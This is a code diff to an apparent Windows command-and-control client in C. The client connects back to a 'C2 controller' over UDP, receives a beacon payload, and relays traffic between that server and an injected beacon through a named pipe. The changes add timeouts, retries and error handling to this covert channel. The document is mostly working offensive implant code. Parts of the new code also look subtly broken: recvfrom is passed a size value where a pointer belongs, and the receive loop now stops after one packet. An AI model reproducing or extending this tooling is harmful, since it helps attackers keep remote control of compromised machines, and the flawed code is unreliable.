@@ -15,7 +15,7 @@
 #define TIMEOUT_SEC  10 //number of seconds to wait before timeout. 
 
 #include <winsock2.h>
-#include <ws2tcpip.h>
+#include <Ws2tcpip.h>
 #include <stdio.h> 
 #include <stdlib.h>
 
@@ -45,9 +45,10 @@ static DWORD my_seqnum = 0;
  *
  * @param ip A pointer to an array containing the IP address to connect to
  * @param port A pointer to an array containing the port to connect on
+ * @param timeout_sec An int to specify socket timeout
  * @return A socket handle for the connection
 */
-SOCKET create_socket(char* ip, char* port)
+SOCKET create_socket(char* ip, char* port, int timeout_sec)
 {
 	int iResult;
 	SOCKET ConnectSocket = INVALID_SOCKET;
@@ -86,6 +87,17 @@ SOCKET create_socket(char* ip, char* port)
 		return INVALID_SOCKET;
 	}
 
+	// Set socket timeout
+	// Note: Windows timeout value is a DWORD in milliseconds, address passed to setsockopt() is const char *
+	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
+			debug_print("%s", "setsockopt rcvtimeout failed\n");
+			return INVALID_SOCKET;
+		}
+	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
+        	debug_print("%s", "setsockopt sndtimeout failed\n");
+			return INVALID_SOCKET;
+		}
+
 	// Connect to server.
 	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
@@ -109,69 +121,160 @@ SOCKET create_socket(char* ip, char* port)
 /**
  * Sends data to server received from our injected beacon
  *
- * @param sockset A set containing only the socket file descriptor
+ * @param sd A socket file descriptor
  * @param data A pointer to an array containing data to send
  * @param len Length of data to send
+ * @param SrvAddr SockAddr struct with IP/Port of server
+ * @param retries Number of times to retry recv after a timeout
+ * @return Number of bytes sent
 */
-void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* timeout_struct) {
-	int pendingAck = 1;
+int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int retries) {
 	int socketsReady = 0;
-	SOCKET sd = sockset->fd_array[0];
+	int iResult = 0;
+	int error = 0;
+	int _retries = retries;
 	char* sizepacket = malloc(8);
+	if (sizepacket == NULL)
+	{
+		debug_print("%s", "Malloc failed\n");
+		return -1;
+	}
 	char* ackpacket = malloc(4);
+	if (ackpacket == NULL)
+	{
+		debug_print("%s", "Malloc failed\n");
+		free(sizepacket);
+		return -1;
+	}
 	memcpy(sizepacket, &my_seqnum, 4);
 	memcpy((sizepacket+4), &len, 4); 
-	while(pendingAck) {
-		send(sd, sizepacket, 8, 0);
-		socketsReady = select(0, sockset, NULL, NULL, timeout_struct);
-		if (socketsReady > 0) {
-			recv(sd, ackpacket, 3, 0);
-			if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
-				pendingAck = 0;
-				my_seqnum++;
+	while(_retries > 0) {
+		iResult = sendto(sd, sizepacket, 8, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (iResult == SOCKET_ERROR)
+			{
+				debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
+				free(sizepacket);
+				free(ackpacket);
+				return(-1);
 			}
-			memset(ackpacket, 0, 4);
+		
+		iResult = recvfrom(sd, ackpacket, 3, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (iResult == SOCKET_ERROR)
+		{
+			error = WSAGetLastError();
+			if (error == WSAETIMEDOUT)
+			{
+				_retries--;
+				debug_print("Recv timeout in sendData, retires left: %d\n", _retries);
+				continue;
+			}
+			debug_print("recvfrom in recvData failed with error %d\n", error);
+			free(sizepacket);
+			free(ackpacket);
+			return(-1);
 		}
-		timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
+		
+		if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) 
+		{
+			my_seqnum++;
+			break;
+		}
+		_retries--;
+		memset(ackpacket, 0, 4);
+		
+	}
+	if (_retries <= 0)
+	{
+		debug_print("%s", "No more retries, exiting\n");
+		free(sizepacket);
+		free(ackpacket);
+		return(-1);
 	}
 	char* packet = calloc(PACKET_SIZE+4, 1);
+	if (packet == NULL)
+	{
+		debug_print("%s", "Couldnt calloc\n");
+		free(sizepacket);
+		free(ackpacket);
+		return(-1);
+	}
+	// Reset retries
+	_retries = retries;
+
 	memset(ackpacket, 0, 4);
 	int remaining = len;
 	debug_print("Sending %d bytes.\n", len);
 	while (remaining > 0) {
-		pendingAck = 1;
 		DWORD temp = 0;
 		memcpy(packet, &my_seqnum, 4);
 		memcpy((packet + 4), (data + (len-remaining)), PACKET_SIZE);
-		while(pendingAck) {
-			select(0, NULL, sockset, NULL, timeout_struct);
-			if (remaining >= PACKET_SIZE) {
-				temp = send(sd, packet, PACKET_SIZE+4, 0);
-			} else {
-				temp = send(sd, packet, remaining+4, 0);
+		while(_retries > 0) {
+			if (remaining >= PACKET_SIZE) 
+			{
+				temp = sendto(sd, packet, PACKET_SIZE+4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+				if (temp == SOCKET_ERROR)
+					{
+						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
+						free(sizepacket);
+						free(ackpacket);
+						return(-1);
+					}
+			} 
+			else 
+			{
+				temp = sendto(sd, packet, remaining+4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+				if (temp == SOCKET_ERROR)
+					{
+						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
+						free(sizepacket);
+						free(ackpacket);
+						return(-1);
+					}
 			}
-			timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
+			
 			debug_print("sent: %d bytes\n", temp);
-			socketsReady = select(0, sockset, NULL, NULL, timeout_struct);
-			if (socketsReady > 0) {
-				recv(sd, ackpacket, 3, 0);
-				debug_print("contents of ackpacket: %s\n", ackpacket);
-				if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
-					pendingAck = 0;
-					my_seqnum++;
-					remaining = remaining - temp + 4;
+			
+			iResult = recvfrom(sd, ackpacket, 3, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+			if (iResult == SOCKET_ERROR)
+			{
+				error = WSAGetLastError();
+				if (error == WSAETIMEDOUT)
+				{
+					_retries--;
+					debug_print("Recv timeout in sendData, retires left: %d\n", _retries);
+					continue;
 				}
-				memset(ackpacket, 0, 4);
+				debug_print("recvfrom in recvData failed with error %d\n", error);
+				free(sizepacket);
+				free(ackpacket);
+				return(-1);
 			}
-			timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
+			
+			debug_print("contents of ackpacket: %s\n", ackpacket);
+			if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
+				my_seqnum++;
+				remaining = remaining - temp + 4;
+				break;
+			}
+			_retries--;
+			memset(ackpacket, 0, 4);
+			
 		}
-		
+		if (_retries <= 0)
+		{
+			debug_print("%s", "No more retries, exiting\n");
+			free(sizepacket);
+			free(ackpacket);
+			return(-1);
+		}
+		_retries = retries;
 		memset(packet, 0, PACKET_SIZE+4);
 	}
 
 	free(sizepacket);
 	free(ackpacket);
 	free(packet);
+	return len;
 }
 
 
@@ -180,55 +283,134 @@ void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* time
  * TODO - this method could include some robustness to out-of-order transmission instead of just doing the ACK dance. 
  *			I was thinking maybe an array to keep track of which sections of the payload buffer are filled.
  *
- * @param sockset A set containing only the socket file descriptor
+ * @param sd A socket file descriptor
  * @param buffer Buffer to store data in
  * @param max unused
+ * @param SrvAddr SockAddr struct with IP/Port of server
+ * @param retries Number of times to retry recv after a timeout
  * @return Size of data recieved
 */
-DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeout_struct) {
-	SOCKET sd = sockset->fd_array[0];
+DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int retries) {
 	debug_print("%s", "Receiving Data\n");
+	DWORD size = 0, temp = 0, seqnum = 0;
+	int iResult = 0;
+	int _retries = retries;
+	int error = 0;
+
 	char* sizePacket = malloc(8);
-	DWORD size = 0, total = 0, temp = 0, seqnum = 0;
+	if (sizePacket == NULL)
+	{
+		debug_print("%s", "Couldnt malloc\n");
+		return(-1);
+	}
 
 	/* read the 4-byte length */
-	while (size == 0) {
-		recv(sd, sizePacket, 8, 0);		//Due to the small size, we assume this succeeds in reading all 8 bytes. 
+	while (_retries > 0) {
+		iResult = recvfrom(sd, sizePacket, 8, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (iResult == SOCKET_ERROR)
+		{
+			error = WSAGetLastError();
+			if (error == WSAETIMEDOUT)
+			{
+				_retries--;
+				debug_print("Recv timeout in recvData, retires left: %d\n", _retries);
+				continue;
+			}
+			debug_print("recvfrom in recvData failed with error %d\n", error);
+			free(sizePacket);
+			return(-1);
+		}
+
 		seqnum = *((DWORD*)sizePacket);
 		if (seqnum <= server_seqnum) {
-			send(sd, "ACK", 4, 0);
+			iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+			if (iResult == SOCKET_ERROR)
+			{
+				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
+				free(sizePacket);
+				return(-1);
+			}
+			
 			if (seqnum == server_seqnum) {
 				server_seqnum++;							//Note: under this implementation, there is a limit to the number of packets per connection.
 				size = *((DWORD*)(sizePacket + 4));			//Once the sequence number overflows, this breaks. 
+				break;
 			} else {
 				debug_print("%s", "Received out of order on size packet.\n");
+				_retries--;
 			}
 		}
+	}
+	if (_retries <= 0)
+	{
+		debug_print("%s", "No more retries, exiting\n");
+		free(sizePacket);
+		return(-1);
 	}
 
 	debug_print("Size: 0x%08x\n", size);
 
 	char* packet = calloc(PACKET_SIZE+4, 1);
-
+	if (packet == NULL)
+	{
+		debug_print("%s", "Couldnt calloc\n");
+		free(sizePacket);
+		return(-1);
+	}
+	// Reset retries
+	_retries = retries;
 	/* read in the data */
-	while (total < size) {
-		temp = recv(sd, packet, PACKET_SIZE+4, 0);		//No danger of reading more than a single packet, as UDP sockets store disjoint datagrams.
+	//TODO: Double check the logic here to make sure we can recv everything we need to.
+	// Old note said "No danger of reading more than a single packet, as UDP sockets store disjoint datagrams."
+	while (_retries > 0) {
+		temp = recvfrom(sd, packet, PACKET_SIZE+4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (temp == SOCKET_ERROR)
+		{
+			error = WSAGetLastError();
+			if (error == WSAETIMEDOUT)
+			{
+				_retries--;
+				debug_print("Recv timeout in recvData, retires left: %d\n", _retries);
+				continue;
+			}
+			debug_print("recvfrom in recvData failed with error %d\n", error);
+			free(packet);
+			free(sizePacket);
+			return -1;
+		}
 		seqnum = *((DWORD*) packet);
-		if (seqnum <= server_seqnum) {
-			send(sd, "ACK", 4, 0);
-			if (seqnum == server_seqnum) {
+		if (seqnum <= server_seqnum)
+		{
+			iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+			if (iResult == SOCKET_ERROR)
+			{
+				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
+				free(packet);
+				free(sizePacket);
+				return(-1);
+			}
+			if (seqnum == server_seqnum)
+			{
 				server_seqnum++;
-				memcpy((buffer + total), (packet + 4), temp - 4);
-				total += temp - 4;
-			} else {
-				debug_print("%s", "Received out of order on data packet\n");
+				memcpy((buffer), (packet + 4), temp - 4);
+				break;
+			}
+			else
+			{
+				debug_print("%s", "Received out of order on size packet.\n");
 			}
 		}
-		memset(packet, 0, PACKET_SIZE+4);
-		debug_print("Total: %08x\n", total);		
+		_retries--;
+		memset(packet, 0, PACKET_SIZE+4);	
+	}
+	if (_retries <= 0)
+	{
+		debug_print("%s", "No more retries, exiting\n");
+		size = -1;
 	}
 	free(packet);
 	free(sizePacket);
+	debug_print("Size: %d\t Temp: %d\n", size, temp);
 	return size;
 
 }
@@ -236,28 +418,63 @@ DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeou
 /**
  * Initiate connection with server via a UDP three-way handshake
  * 
- * @param sockset set containing the UDP socket to send/receive from
- * @param timeout_struct Structure containing timeout information
+ * @param sd A socket file descriptor
+ * @param SrvAddr SockAddr struct with IP/Port of server
+ * @param retries Number of times to retry recv after a timeout
+ * @return Return 0 on success
  */
-void threeWayHandshake(fd_set* sockset, struct timeval* timeout_struct) {
-	int complete = 0;
-	SOCKET sd = sockset->fd_array[0];
+int threeWayHandshake(SOCKET sd, SOCKADDR_IN SrvAddr, int retries) {
+	int _retries = retries;
+	int iResult = 0;
+	int error = 0;
 	char* synack = calloc(4, 1);
-	while (complete == 0) {
-		send(sd, (char *)&my_seqnum, 4, 0); //We assume this sends fully, due to the small size
-		int ready = select(0, sockset, NULL, NULL, timeout_struct);
-		if (ready > 0) {
-			recv(sd, synack, 4, 0);
-			server_seqnum = *(DWORD*)(synack);
-			server_seqnum++;
-			my_seqnum++;
-			complete = 1;
-		}
-		timeout_struct->tv_sec = TIMEOUT_SEC;
+	if (synack == NULL)
+	{
+		debug_print("%s", "Couldnt calloc\n");
+		return(-1);
 	}
-	send(sd, "ACK", 4, 0);
+	while (_retries > 0) {
+		iResult = sendto(sd, (char *)&my_seqnum, 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (iResult == SOCKET_ERROR)
+		{
+			debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
+			free(synack);
+			return(-1);
+		}
+		iResult = recvfrom(sd, synack, 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		if (iResult == SOCKET_ERROR)
+		{
+			error = WSAGetLastError();
+			if (error == WSAETIMEDOUT)
+			{
+				_retries--;
+				debug_print("Recv timeout in threeWayHandshake, retires left: %d\n", _retries);
+				continue;
+			}
+			debug_print("recvfrom in threeWayHandshake failed with error %d\n", error);
+			free(synack);
+			return(-1);
+		}
+		server_seqnum = *(DWORD*)(synack);
+		server_seqnum++;
+		my_seqnum++;
+		break;
+	}
+	if (_retries <= 0)
+	{
+		debug_print("%s", "No more retries, exiting\n");
+		free(synack);
+		return(-1);
+	}
+	iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+	if (iResult == SOCKET_ERROR)
+	{
+		debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
+		free(synack);
+		return(-1);
+	}
 	free(synack);
-
+	return(0);
 }
 
 
@@ -306,10 +523,10 @@ void main(int argc, char* argv[])
 //TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
 {
 	// Set connection info
-	if (argc != 5)
+	if (argc != 7)
 	{
 		debug_print("Incorrect number of args: %d\n", argc);
-		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [SLEEP]", argv[0]);
+		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [SLEEP] [TIMEOUT] [RETRIES]", argv[0]);
 		exit(1);
 	}
 
@@ -328,14 +545,27 @@ void main(int argc, char* argv[])
 	int sleep;
 	sleep = atoi(argv[4]);
 
+	int TIMEOUT;
+	TIMEOUT = atoi(argv[5])*1000;
+
+	int RETRIES;
+	RETRIES = atoi(argv[6]);
+
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
 	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
 
+	SOCKADDR_IN SrvAddr;
+	SrvAddr.sin_family = AF_INET;
+	SrvAddr.sin_port = htons(atoi(PORT));
+	SrvAddr.sin_addr.s_addr = inet_addr(IP);
+
+	int iResult = 0;
+
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
 
-	sockfd = create_socket(IP, PORT);
+	sockfd = create_socket(IP, PORT, TIMEOUT);
 	if (sockfd == INVALID_SOCKET)
 	{
 		debug_print("%s", "Socket creation error!\n");
@@ -343,21 +573,14 @@ void main(int argc, char* argv[])
 	}
 	debug_print("%s", "Socket Created\n");
 
-	//Create socket set of 1 socket
-	//This is so we can use the select() function on our socket
-	fd_set sock_set;
-	FD_ZERO(&sock_set);
-	FD_SET(sockfd, &sock_set);
-
-	// Create timeval structure for 5 seconds
-	// This is so we can use the select() function on our socket without infinite blocking
-	struct timeval timeout_struct;
-	ZeroMemory(&timeout_struct, sizeof(timeout_struct));
-	timeout_struct.tv_sec = TIMEOUT_SEC;
-	timeout_struct.tv_usec = 0;
-
 	// run 3-way handshake with beacon
-	threeWayHandshake(&sock_set, &timeout_struct);
+	iResult = threeWayHandshake(sockfd, SrvAddr, RETRIES);
+	if (iResult != 0)
+	{
+		debug_print("%s", "threeWayHandshake returned error\n");
+		closesocket(sockfd);
+		exit(1);
+	}
 	debug_print("%s", "Handshake completed.\n");
 
 	// Recv beacon payload
@@ -365,13 +588,15 @@ void main(int argc, char* argv[])
 	if (payload == NULL)
 	{
 		debug_print("%s", "payload buffer malloc failed!\n");
+		closesocket(sockfd);
 		exit(1);
 	}
 
-	DWORD payload_size = recvData(&sock_set, payload, PAYLOAD_MAX_SIZE, &timeout_struct);
+	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE, SrvAddr, RETRIES);
 	if (payload_size < 0)
 	{
 		debug_print("%s", "recvData error, exiting\n");
+		closesocket(sockfd);
 		free(payload);
 		exit(1);
 	}
@@ -399,6 +624,8 @@ void main(int argc, char* argv[])
 	if (buffer == NULL)
 	{
 		debug_print("%s", "buffer malloc failed!\n");
+		closesocket(sockfd);
+		CloseHandle(beaconPipe);
 		free(payload);
 		exit(1);
 	}
@@ -406,7 +633,7 @@ void main(int argc, char* argv[])
 	while (1) {
 		// Start the pipe dance
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
-		if (read_size < 0)
+		if (read_size <= 0)
 		{
 			debug_print("%s", "read_frame error, exiting\n");
 			break;
@@ -419,11 +646,16 @@ void main(int argc, char* argv[])
 			Sleep(sleep*1000);
 		}
 
-		sendData(&sock_set, buffer, read_size, &timeout_struct);
+		int send_size = sendData(sockfd, buffer, read_size, SrvAddr, RETRIES);
+		if (send_size < 0)
+		{
+			debug_print("%s", "sendData error, exiting\n");
+			break;
+		}
 		debug_print("%s", "Sent to TS\n");
 		
-		read_size = recvData(&sock_set, buffer, BUFFER_MAX_SIZE, &timeout_struct);
-		if (read_size < 0)
+		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE, SrvAddr, RETRIES);
+		if (read_size <= 0)
 		{
 			debug_print("%s", "recvData error, exiting\n");
 			break;
@@ -433,7 +665,6 @@ void main(int argc, char* argv[])
 		write_frame(beaconPipe, buffer, read_size);
 		debug_print("%s", "Sent to beacon\n");
 	}
-	FD_CLR(sockfd, &sock_set);
 	free(payload);
 	free(buffer);
 	closesocket(sockfd);
